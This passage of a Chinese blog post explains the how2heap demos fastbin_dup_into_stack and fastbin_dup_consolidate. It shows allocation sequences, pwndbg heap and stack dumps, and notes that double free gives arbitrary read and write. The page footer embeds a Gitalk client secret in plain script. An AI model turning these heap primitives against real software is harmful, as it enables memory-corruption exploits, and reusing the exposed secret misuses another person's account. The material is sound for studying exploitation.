]. We&#39;ll now carry out our attack by modifying data at 0x603010.</span><br><span class="line">1st malloc(8): 0x603010</span><br><span class="line">2nd malloc(8): 0x603030</span><br><span class="line">Now the free list has [ 0x603010 ].</span><br><span class="line">Now, we have access to 0x603010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x603010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x603010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7fffffffdca8</span><br></pre></td></tr></table></figure>

<h3 id="顺序-1"><a href="#顺序-1" class="headerlink" title="顺序"></a>顺序</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a &#x3D; malloc(8)</span><br><span class="line">b &#x3D; malloc(8)</span><br><span class="line">c &#x3D; malloc(8)</span><br><span class="line">free(a)</span><br><span class="line">free(b)</span><br><span class="line">free(a)</span><br><span class="line">d &#x3D; malloc(8)</span><br><span class="line">malloc(8)</span><br><span class="line">stack_var &#x3D; 0x20</span><br><span class="line">*d &#x3D; (unsigned long long) (((char*)&amp;stack_var) - sizeof(d))</span><br><span class="line">malloc(8)</span><br><span class="line">malloc(8)</span><br></pre></td></tr></table></figure>

<h3 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h3><p>和上一题类似，首先申请三个 fastbin，然后通过 fastbin double free 操作形成了如下 freelist：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x603020 ◂— 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>接下来 malloc chunk d。</p>
<p>因为申请的 d 也是 fastbin，程序会从 fastbins 中取一个出来。由于 fastbins 是 LIFO 策略，chunk A 会被取出来使用。此时的堆地址的数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:	0x0	0x21</span><br><span class="line">0x603010:	0x603020	0x0</span><br><span class="line">0x603020:	0x0	0x21</span><br><span class="line">0x603030:	0x603000	0x0</span><br><span class="line">0x603040:	0x0	0x21</span><br><span class="line">0x603050:	0x0	0x0</span><br><span class="line">0x603060:	0x0	0x20fa1</span><br><span class="line">0x603070:	0x0	0x0</span><br><span class="line">0x603080:	0x0	0x0</span><br><span class="line">0x603090:	0x0	0x0</span><br></pre></td></tr></table></figure>

<p>假如我们此时对 d 进行操作：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br></pre></td></tr></table></figure>

<p>其中，<code>stack_var = 0x20</code> 的定义在函数内，也就是栈上。此时栈结构及其数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x7fffffffdc58, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x21</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:	0x0	0x21</span><br><span class="line">0x603010:	0x7fffffffdc58	0x0</span><br><span class="line">0x603020:	0x0	0x21</span><br><span class="line">0x603030:	0x603000	0x0</span><br><span class="line">0x603040:	0x0	0x21</span><br><span class="line">0x603050:	0x0	0x0</span><br><span class="line">0x603060:	0x0	0x20fa1</span><br><span class="line">0x603070:	0x0	0x0</span><br><span class="line">0x603080:	0x0	0x0</span><br><span class="line">0x603090:	0x0	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x7fffffffdc58</span><br><span class="line">0x7fffffffdc58:	0x40091a &lt;main+628&gt;	0x20</span><br><span class="line">0x7fffffffdc68:	0x603010	0x603030</span><br><span class="line">0x7fffffffdc78:	0x603050	0x603010</span><br><span class="line">0x7fffffffdc88:	0x627da7b743913600	0x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffdc98:	0x7ffff7a2d830 &lt;__libc_start_main+240&gt;	0x1</span><br><span class="line">0x7fffffffdca8:	0x7fffffffdd78	0x1f7ffcca0</span><br><span class="line">0x7fffffffdcb8:	0x4006a6 &lt;main&gt;	0x0</span><br><span class="line">0x7fffffffdcc8:	0x4083e6753a0065fe	0x4005b0 &lt;_start&gt;</span><br><span class="line">0x7fffffffdcd8:	0x7fffffffdd70	0x0</span><br><span class="line">0x7fffffffdce8:	0x0	0xbf7c190a900065fe</span><br><span class="line">pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffdc60 ◂— 0x20 &#x2F;* &#39; &#39; *&#x2F;</span><br><span class="line">01:0008│      0x7fffffffdc68 —▸ 0x603010 —▸ 0x7fffffffdc58 —▸ 0x40091a (main+628) ◂— 0x8e88348d0458d48</span><br><span class="line">02:0010│      0x7fffffffdc70 —▸ 0x603030 —▸ 0x603000 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdc78 —▸ 0x603050 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffdc80 —▸ 0x603010 —▸ 0x7fffffffdc58 —▸ 0x40091a (main+628) ◂— 0x8e88348d0458d48</span><br><span class="line">05:0028│      0x7fffffffdc88 ◂— 0xb279771f7980f400</span><br><span class="line">06:0030│ rbp  0x7fffffffdc90 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741</span><br><span class="line">07:0038│      0x7fffffffdc98 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">08:0040│      0x7fffffffdca0 ◂— 0x1</span><br><span class="line">09:0048│      0x7fffffffdca8 —▸ 0x7fffffffdd78 —▸ 0x7fffffffe142 ◂— &#39;&#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;glibc_2.25&#x2F;fastbin_dup_into_stack&#39;</span><br></pre></td></tr></table></figure>

<p>给 <code>stack_var</code> 赋值为 20 的原因是由于伪造的 chunk 要设置 size，size 的位置位于 <code>地址-0x8</code> 的地方。这样我们就伪造了 chunk a 的 fd。</p>
<p>此时 fastbins 内部结构如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x7fffffffdc58 —▸ 0x603010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>然后做一次 malloc，这里会将栈的地址放到 free list 上；</p>
<p>最后再 malloc 一次，根据上面的输出我们可以看到已经返回到栈上了。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
<p>对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了<strong>任意地址写</strong>和<strong>任意地址读</strong>。</p>
</blockquote>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>这里展示了 large bin 中 malloc_consolidate 机制 fast 对 double free 的检查。</p>
<h3 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1&#x3D;0x602010 p2&#x3D;0x602060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3&#x3D;0x6020b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x602010 0x602010</span><br></pre></td></tr></table></figure>

<h3 id="顺序："><a href="#顺序：" class="headerlink" title="顺序："></a>顺序：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p1 &#x3D; malloc(0x40)</span><br><span class="line">p2 &#x3D; malloc(0x40)</span><br><span class="line">free(p1)</span><br><span class="line">p3 &#x3D; malloc(0x400)</span><br><span class="line">free(p1)</span><br><span class="line">malloc(40)</span><br><span class="line">malloc(40)</span><br></pre></td></tr></table></figure>

<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>首先申请两个 fastbin p1、p2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135009, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后释放 p1，p1 被加入了 fastbins 中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>

<p>接下来 <code>malloc(400)</code>，创建了一个 large bin。</p>
<hr>
<p>large bins</p>
<p>chunk 的指针数组，每个元素是一条双向循环链表的头部，但同一条链表中的块大小不一定相同，按照从小到大的顺序排列，每个 bin 保存一定大小范围的块，主要保存大小为 1024 字节以上的块。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">pwndbg&gt; smallbins </span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000</span><br></pre></td></tr></table></figure>

<p>我们会发现原本在 fastbins 中的 chunk p1 不见了，它跑到了 smallbins 里，而且 chunk p2 的 <code>prec_size</code> 和 <code>size</code> 字段都被修改了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1bb8 &lt;main_arena+152&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1bb8 &lt;main_arena+152&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 &#123;</span><br><span class="line">  prev_size &#x3D; 80, </span><br><span class="line">  size &#x3D; 80, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 1041, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6024b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 133969, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候就该读源码，查看 large 的分配：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。</p>
</blockquote>
<p>这个时候我们就可以再次释放 p1。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">pwndbg&gt; smallbins </span><br><span class="line">smallbins</span><br><span class="line">0x50 [corrupted]</span><br><span class="line">FD: 0x602000 ◂— 0x0</span><br><span class="line">BK: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000</span><br></pre></td></tr></table></figure>

<p>这个时候，我们既有 fastbins 中的 p1 又有 smallbins 中的 p2。因此我们可以 malloc 两次，第一次从 fastbins 中取出，第二次从 smallbins 中取出，且这两块新 chunk 处于同一个位置。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">QRZ</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.qrzbing.cn/2019/07/08/how2heap-1/">http://blog.qrzbing.cn/2019/07/08/how2heap-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.qrzbing.cn">QRZ's Blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/07/08/how2heap-2/"><i class="fa fa-chevron-left">  </i><span>how2heap - 2</span></a></div><div class="next-post pull-right"><a href="/2019/06/17/%E7%BB%8F%E5%85%B8%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98/"><span>生产者消费者问题</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: 'a28396a0fb37fdc22bce',
  clientSecret: 'e2e4c983cd284773491d067c6055febad1c23689',
  repo: '40m41h42t.github.io',
  owner: '40m41h42t',
  admin: '40m41h42t',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/40m41h42t/Images/master/2019/09/866283.png)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2020 By QRZ</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
  tex2jax: {
    inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
    processEscapes: true,
    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
  },
  CommonHTML: {
    linebreaks: { automatic: true, width: "90% container" }
  },
  "HTML-CSS": { 
    linebreaks: { automatic: true, width: "90% container" }
  },
  "SVG": { 
    linebreaks: { automatic: true, width: "90% container" }
  }
});
</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
  var all = MathJax.Hub.getAllJax(), i;
  for (i=0; i < all.length; i += 1) {
    all[i].SourceElement().parentNode.className += ' has-jax';
  }
});
</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>